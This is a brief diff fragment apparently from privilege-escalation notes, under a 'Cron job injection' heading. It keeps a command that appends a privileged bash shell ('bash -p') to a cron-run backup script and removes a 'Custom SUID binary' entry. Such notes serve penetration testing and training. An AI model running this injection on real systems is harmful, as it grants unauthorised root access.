@@ -102,9 +102,7 @@ Cron job injection
 
 echo "/usr/local/bin/bash -p" >> /opt/backup/backup.sh
 
- Custom SUID binary
 
-/usr/local/bin/privesc
 
 EOF
 
